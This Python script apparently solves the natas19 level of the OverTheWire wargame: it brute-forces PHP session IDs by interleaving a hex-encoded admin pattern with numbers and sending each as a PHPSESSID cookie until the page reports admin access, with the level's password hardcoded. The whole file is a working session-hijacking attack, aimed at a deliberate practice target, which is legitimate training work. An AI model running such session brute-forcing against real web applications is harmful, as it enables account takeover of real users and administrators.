#!/usr/bin/python3

import requests

BASE_URL = "http://natas19.natas.labs.overthewire.org?debug"
EXPECTED_OUTPUT = "You are an admin."
AUTHENTICATION = {'username': 'natas19',
                  'password': '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'}


def is_valid_url(url: str, cookies: dict, expected_output: str) -> bool:
    """
    Check if the given URL returns the expected output.
    """
    session = requests.Session()
    session.auth = (AUTHENTICATION['username'], AUTHENTICATION['password'])
    response = session.get(url=url, cookies=cookies)

    data = response.text
    return expected_output in data


def merge_strings(string1, string2):
    """
    Merge 2 strings char by char
    """
    min_len = min(len(string1), len(string2))
    return ''.join(map(''.join, zip(string1, string2))) + string1[min_len:] + string2[min_len:]


def run_brute_force() -> str:
    """
    Starts brute force and return result.
    """
    pattern = "3332d61646d696e"
    cookies_dict = dict(PHPSESSID="")
    for i in range(999):
        # go through all possible session ids
        cookie_id = merge_strings(pattern, f'{i:03}')
        cookies_dict['PHPSESSID'] = cookie_id
        if is_valid_url(BASE_URL, cookies_dict, EXPECTED_OUTPUT):
            return cookie_id
    return ""


def main():
    print("Starting brute force...")
    admin_id = run_brute_force()
    print("Brute force result:", admin_id)


if __name__ == "__main__":
    main()
